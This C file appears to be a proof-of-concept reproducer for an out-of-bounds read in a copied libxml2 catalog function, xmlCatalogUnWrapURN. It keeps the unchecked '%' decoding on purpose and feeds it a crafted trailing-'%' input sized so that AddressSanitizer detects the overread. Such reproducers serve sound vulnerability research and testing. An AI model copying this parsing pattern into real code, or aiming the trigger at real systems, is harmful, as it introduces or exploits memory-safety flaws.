#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Minimal libxml2-like typedefs and helpers */
typedef unsigned char xmlChar;

#define BAD_CAST (xmlChar *)
#define XML_URN_PUBID "urn:publicid:"

static int xmlStrncmp(const xmlChar *s1, const xmlChar *s2, int len) {
    return strncmp((const char *)s1, (const char *)s2, (size_t)len);
}

static xmlChar *xmlStrdup(const xmlChar *s) {
    size_t len = strlen((const char *)s);
    xmlChar *out = (xmlChar *)malloc(len + 1);
    if (out == NULL) return NULL;
    memcpy(out, s, len + 1);
    return out;
}

/* Vulnerable function copied/adapted from the provided source context */
static xmlChar *
xmlCatalogUnWrapURN(const xmlChar *urn) {
    xmlChar result[2000];
    unsigned int i = 0;

    if (xmlStrncmp(urn, BAD_CAST XML_URN_PUBID, sizeof(XML_URN_PUBID) - 1))
        return(NULL);
    urn += sizeof(XML_URN_PUBID) - 1;

    while (*urn != 0) {
        if (i > sizeof(result) - 4)
            break;
        if (*urn == '+') {
            result[i++] = ' ';
            urn++;
        } else if (*urn == ':') {
            result[i++] = '/';
            result[i++] = '/';
            urn++;
        } else if (*urn == ';') {
            result[i++] = ':';
            result[i++] = ':';
            urn++;
        } else if (*urn == '%') {
            /* BUG: No length checks before accessing urn[1] and urn[2] */
            if ((urn[1] == '2') && (urn[2] == 'B'))
                result[i++] = '+';
            else if ((urn[1] == '3') && (urn[2] == 'A'))
                result[i++] = ':';
            else if ((urn[1] == '2') && (urn[2] == 'F'))
                result[i++] = '/';
            else if ((urn[1] == '3') && (urn[2] == 'B'))
                result[i++] = ';';
            else if ((urn[1] == '2') && (urn[2] == '7'))
                result[i++] = '\'';
            else if ((urn[1] == '3') && (urn[2] == 'F'))
                result[i++] = '?';
            else if ((urn[1] == '2') && (urn[2] == '3'))
                result[i++] = '#';
            else if ((urn[1] == '2') && (urn[2] == '5'))
                result[i++] = '%';
            else {
                result[i++] = *urn;
                urn++;
                continue;
            }
            urn += 3;
        } else {
            result[i++] = *urn;
            urn++;
        }
    }
    result[i] = 0;

    return(xmlStrdup(result));
}

int main(void) {
    /* Craft input ending with an incomplete percent-encoding to trigger OOB read */
    const char *input = "urn:publicid:%"; /* After skipping prefix, urn points to '%\0' */
    size_t len = strlen(input);

    /* Heap-allocate exact size so ASan places a redzone right after the string */
    char *buf = (char *)malloc(len + 1);
    if (!buf) {
        perror("malloc");
        return 1;
    }
    memcpy(buf, input, len + 1);

    xmlChar *out = xmlCatalogUnWrapURN((const xmlChar *)buf);
    if (out) {
        /* Use the result to prevent optimizing away */
        printf("Unwrapped: %s\n", (char *)out);
        free(out);
    } else {
        printf("xmlCatalogUnWrapURN returned NULL\n");
    }

    free(buf);
    return 0;
}
